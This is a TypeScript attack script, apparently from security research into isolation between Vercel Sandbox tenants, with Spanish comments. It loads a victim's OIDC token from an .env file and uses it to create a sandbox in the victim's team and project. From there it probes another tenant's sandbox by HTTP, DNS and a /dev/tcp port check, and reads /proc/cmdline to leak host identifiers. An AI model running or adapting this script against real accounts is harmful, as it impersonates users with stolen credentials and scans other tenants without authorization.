import { Sandbox } from "@vercel/sandbox";
import { readFileSync } from "fs";
function loadEnv(file: string): Record<string, string> {
  const out: Record<string, string> = {};
  for (const line of readFileSync(file, "utf8").split("\n")) {
    const m = line.match(/^([A-Z_]+)=(.*)$/);
    if (m) out[m[1]] = m[2].trim();
  }
  return out;
}
const VICTIM = loadEnv("/tmp/vercel-sandbox/victima/.env.local").VERCEL_OIDC_TOKEN!;
const V = JSON.parse(Buffer.from(VICTIM.split(".")[1], "base64url").toString());

async function main() {
  const sbx = await Sandbox.create({
    name: "atk-probe-" + Date.now(),
    token: VICTIM, teamId: V.owner_id, projectId: V.project_id,
    source: { type: "git", url: "https://github.com/vercel/sandbox-example-next.git" },
  });
  console.log("sandbox atacante id:", sbx.id);

  const TARGET = "sb-1phoxyil6njl.vercel.run";
  const res = await sbx.runCommand("bash", ["-c", `
set +e
echo "=== A. alcanzar victim2 por su dominio publico (allow-all) ==="
timeout 8 curl -s -o /tmp/t -w "code=%{http_code}\\n" --max-time 6 "https://${TARGET}/" 2>&1 | tail -1
head -c 150 /tmp/t 2>/dev/null; echo ""
echo "=== B. DNS de victim2 ==="
getent hosts ${TARGET} 2>&1 | head -2
echo "=== C. puerto 3000 de victim2 ==="
timeout 4 bash -c "echo > /dev/tcp/${TARGET}/3000" 2>/dev/null && echo "3000 OPEN" || echo "3000 bloqueado"
echo "=== D. egress del sandbox atacante (baseline) ==="
timeout 4 curl -s -o /dev/null -w "egress code=%{http_code}\\n" --max-time 3 https://example.com 2>&1 | tail -1
echo "=== E. mi propia identidad (leak) ==="
cat /proc/cmdline 2>/dev/null | tr ' ' '\\n' | grep -aiE "cell_id|build_version" | head -2
echo DONE
`], { wait: true, timeout: 60_000 });
  console.log("exit:", res.exitCode);
  console.log(await res.output("both"));
  await sbx.delete();
}
main().catch((e) => { console.error("ERR", e.message); process.exit(1); });
